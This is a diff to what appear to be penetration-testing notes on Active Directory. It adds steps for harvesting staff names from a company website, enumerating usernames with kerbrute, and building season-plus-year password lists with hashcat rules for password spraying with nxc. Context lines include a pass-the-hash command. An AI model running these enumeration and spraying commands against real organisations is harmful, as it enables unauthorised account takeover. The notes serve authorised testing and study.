@@ -48,6 +48,23 @@ Get-DomainPolicy
 
 ## Building a Target User List
 
+### Public Website Names
+
+Company websites often expose staff names on pages such as `/Team`. Convert those names to likely AD usernames and validate them with Kerberos user enumeration:
+
+```bash
+username-anarchy "Joanne Lewis" > /tmp/usernames.txt
+kerbrute userenum --dc DC_IP --domain domain.local /tmp/usernames.txt -v
+```
+
+If one naming format is valid, generate the same pattern for all names. For example, `first.last`:
+
+```text
+Joanne.Lewis
+Matthew.Harrison
+Rebecca.Bell
+```
+
 ### SMB NULL Session
 
 ```
@@ -147,6 +164,38 @@ sudo nxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc657
 * Welcome1, Password1, Password123
 * Company name + numbers/special chars
 * Month + Year patterns
+
+### Build Season+Year Lists from Site Dates
+
+If the target website exposes a copyright or build year, generate seasonal passwords around that year. For example, a `© 2023` footer led to `Summer2023`.
+
+```bash
+cat seasons.txt
+summer
+winter
+spring
+fall
+```
+
+Simple rule for `SeasonYYYY`, plus a few common suffix variants:
+
+```text
+$2 $0 $2 $3
+$2 $0 $2 $3 $!
+$2 $0 $2 $3 $! $@
+$2 $0 $2 $3 $! $@ $#
+c $2 $0 $2 $3
+c $2 $0 $2 $3 $!
+c $2 $0 $2 $3 $! $@
+c $2 $0 $2 $3 $! $@ $#
+```
+
+Generate and spray carefully:
+
+```bash
+hashcat -r season.rule --stdout seasons.txt > simple-seasons.txt
+nxc ldap DOMAIN -d DOMAIN -u users.txt -p simple-seasons.txt -t 3 | grep '+'
+```
 
 ## Mitigations
 
